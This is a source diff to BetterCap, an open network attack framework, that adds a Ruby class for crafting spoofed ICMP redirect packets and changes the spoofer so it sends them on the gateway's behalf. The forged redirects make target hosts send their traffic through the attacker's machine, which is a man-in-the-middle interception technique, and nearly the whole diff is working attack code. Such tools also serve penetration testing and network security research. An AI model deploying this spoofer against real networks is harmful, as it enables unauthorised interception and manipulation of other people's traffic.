@@ -18,14 +18,67 @@ require 'colorize'
 
 module BetterCap
 module Spoofers
+# Class to create ICMP redirection packets.
+class ICMPRedirectPacket < PacketFu::Packet
+    ICMP_REDIRECT = 5
+    ICMP_REDIRECT_HOST = 1
+
+    IP_PROTO_ICMP = 1
+    IP_PROTO_UDP  = 17
+
+    include PacketFu::EthHeaderMixin
+    include PacketFu::IPHeaderMixin
+    include PacketFu::ICMPHeaderMixin
+    include PacketFu::UDPHeaderMixin
+
+    attr_accessor :eth_header, :ip_header, :icmp_header, :ip_encl_header
+
+    def initialize(args={})
+      @eth_header = PacketFu::EthHeader.new(args).read(args[:eth])
+
+      @ip_header          = PacketFu::IPHeader.new(args).read(args[:ip])
+      @ip_header.ip_proto = IP_PROTO_ICMP
+
+      @icmp_header           = PacketFu::ICMPHeader.new(args).read(args[:icmp])
+      @icmp_header.icmp_type = ICMP_REDIRECT
+      @icmp_header.icmp_code = ICMP_REDIRECT_HOST
+
+      @ip_encl_header          = PacketFu::IPHeader.new(args).read(args[:ip])
+      @ip_encl_header.ip_proto = IP_PROTO_UDP
+
+      @udp_dummy         = PacketFu::UDPPacket.new
+      @udp_dummy.udp_src = 53
+      @udp_dummy.udp_dst = 53
+
+      @ip_header.body = @icmp_header
+      @eth_header.body = @ip_header
+
+      @headers = [@eth_header, @ip_header, @icmp_header]
+      super
+    end
+
+    def update!( ip_saddr, ip_daddr, fake_gateway, ip_encl_saddr, ip_encl_daddr )
+      @ip_header.ip_saddr = ip_saddr
+      @ip_header.ip_daddr = ip_daddr
+
+      @udp_dummy.ip_saddr = ip_encl_saddr
+      @udp_dummy.ip_daddr = ip_encl_daddr
+      @udp_dummy.recalc
+
+      @icmp_header.body = fake_gateway.split('.').collect(&:to_i).pack('C*') +
+                          @udp_dummy.ip_header.to_s
+
+      recalc
+    end
+end
+
 # This class is responsible of performing ICMP redirect attack on the network.
 class Icmp < Base
-  ICMP_REDIRECT      = 5
-  ICMP_REDIRECT_HOST = 1
-
   # Initialize the BetterCap::Spoofers::Icmp object.
   def initialize
     Logger.warn "!!! 'BetterCap::Spoofers::Icmp' IS AN EXPERIMENTAL MODULE, IT'S NOT GUARANTEED TO WORK !!!\n"
+
+    # TODO: echo 0 > /proc/sys/net/ipv4/conf/all/send_redirect
 
     @ctx          = Context.get
     @forwarding   = @ctx.firewall.forwarding_enabled?
@@ -46,18 +99,10 @@ class Icmp < Base
 
   # Send an ICMP redirect to the target identified by the +target+ IP address.
   def send_spoofed_packet( target )
-    Logger.debug "Sending ICMP Redirect to #{target.to_s_compact} from #{@address} ..."
+    Logger.debug "Sending ICMP Redirect to #{target.to_s_compact} ..."
 
-    pkt           = PacketFu::ICMPPacket.new
-    pkt.eth_saddr = @gateway.mac
-    pkt.eth_daddr = target.mac
-    pkt.icmp_type = ICMP_REDIRECT
-    pkt.icmp_code = ICMP_REDIRECT_HOST
-    pkt.ip_saddr  = @gateway.ip
-    pkt.ip_daddr  = target.ip
-    pkt.payload   = @address.split('.').collect(&:to_i).pack('C*') + "aaaa"
-
-    pkt.recalc
+    pkt = ICMPRedirectPacket.new
+    pkt.update!( @gateway.ip, target.ip, @address, target.ip, @gateway.ip )
     pkt.to_w(@ctx.ifconfig[:iface])
   end
 
